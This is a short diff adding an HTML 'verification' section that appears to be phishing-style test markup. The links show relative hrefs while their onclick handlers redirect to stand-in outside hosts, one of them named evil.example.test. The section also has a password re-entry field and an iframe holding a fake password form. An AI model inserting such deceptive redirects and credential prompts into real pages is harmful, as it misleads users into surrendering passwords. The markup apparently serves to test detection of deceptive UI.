@@ -1,0 +1,8 @@
+<section id="verify">
+    <p>Your session needs verification before you save. Continue at the verification portal, then come back.</p>
+    <a href="/page/form" onclick="location = 'http://cdn.example.test/page/form'; return false">Continue to the verification portal</a>
+    <button onclick="window.open('http://cdn.example.test/page/form')">Open the secure sign-in window</button>
+    <a href="/page/form" onclick="location = 'http://evil.example.test/'; return false">Report a problem</a>
+    <label>Re-enter your password to continue <input id="again"></label>
+    <iframe src="data:text/html,<label>Password <input type=password></label><button>Verify your password</button>"></iframe>
+</section>
